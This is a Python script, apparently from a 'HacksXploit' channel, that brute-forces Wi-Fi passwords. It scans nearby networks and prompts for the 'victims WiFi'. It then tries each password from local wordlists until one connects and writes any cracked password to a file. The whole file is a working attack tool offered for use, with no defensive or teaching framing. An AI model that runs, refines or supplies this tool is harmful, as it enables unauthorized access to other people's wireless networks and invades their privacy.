
import wifi
import os
import time

from datetime import datetime

wifi = wifi.WiFi()



def print_logo():
	print('''
 _    _ _______ _  ______                 _      ______                 
| |  | (_)  ___(_) | ___ \\               | |     |  ___|                
| |  | |_| |_   _  | |_/ /_ __ ___  _   _| |_ ___| |_ ___  _ __ ___ ___ 
| |/\\| | |  _| | | | ___ \\ '__/ _ \\| | | | __/ _ \\  _/ _ \\| '__/ __/ _ \\
\\  /\\  / | |   | | | |_/ / | | (_) | |_| | ||  __/ || (_) | | | (_|  __/
 \\/  \\/|_\\_|   |_| \\____/|_|  \\___/ \\__,_|\\__\\___\\_| \\___/|_|  \\___\\___|


Github - https://github.com/HacksXploit
Youtube - https://www.youtube.com/channel/UCjtl89ElsbFESTl_rbdpwwQ/featured
Telegram - https://t.me/HacksXploit
Instagram - https://www.instagram.com/hacksxploit/


    ''')


while True:

    os.system('cls')

    print_logo()

    wifi_networks = wifi.scan()

    for index in range(len(wifi_networks)):
        print(f'[{index}] {wifi_networks[index].ssid}')

    print()

    scaned_passwords = 0
    delay = 0
    if_hacked = True

    try:
        ssid = input('Choose WiFi network or enter BSSID of victims WiFi: ')

        try:
            ssid = wifi_networks[int(ssid)].ssid
        except:
            pass

        try:
            delay = float(input('Enter delay of connecting and checking: '))
        except:
            delay = 0.5

        input('Press START to start brouteforce')
    except:
        os.system('cls')
        exit()


    pr = wifi.Profile(
        ssid, key = 'password'
    )

    try:
        wifi.disconnect()
    except:
        pass

    time_now = str(datetime.now(tz=None))

    time_start = [
            int(time_now[11:13]),
            int(time_now[14:16]),
            int(time_now[17:19])
        ]

    path_to_dbs = os.getcwd() + '\\DBS\\'

    sp_with_pathes = []

    for bd in os.walk(path_to_dbs):
        for name_bd_with_passwords in bd[2]:
            sp_with_pathes.append(f'{path_to_dbs}{name_bd_with_passwords}')
        break

    for path in sp_with_pathes:
        bd_with_passwords = open(path).readlines()

        for password in bd_with_passwords:
            if password[-1] == '\n':
                password = password[:-1]
        
            scaned_passwords += 1
        
            pr.key = password
            wifi.update_profiles(pr)
        
            try:
                time.sleep(delay)
            
                wifi.check_connection()
            
                os.system('cls')
                print_logo()
            
                print(f'SSID: {ssid}; Password: {password};\nScaned: {scaned_passwords}/{len(bd_with_passwords)}')
            
                open('info.txt', 'a').write(f'{ssid} >> {password} >> ')
            
                break
            except:
                print(f'Uncorrect password: "{password}"; Scaned: {scaned_passwords}/{len(bd_with_passwords)}')
        else:
            continue

        break

    
    time_now = str(datetime.now(tz=None))

    time_finish = [
            int(time_now[11:13]),
            int(time_now[14:16]),
            int(time_now[17:19])
        ]

    open('info.txt', 'a').write(f'{time_finish[0] - time_start[0]}:{time_finish[1] - time_start[1]}:{time_finish[2] - time_start[2]}\n')

    print(f'Finished in {time_finish[0] - time_start[0]} hours {time_finish[1] - time_start[1]} minuts {time_finish[2] - time_start[2]} seconds.')
    input('Press ENTER to continue.')
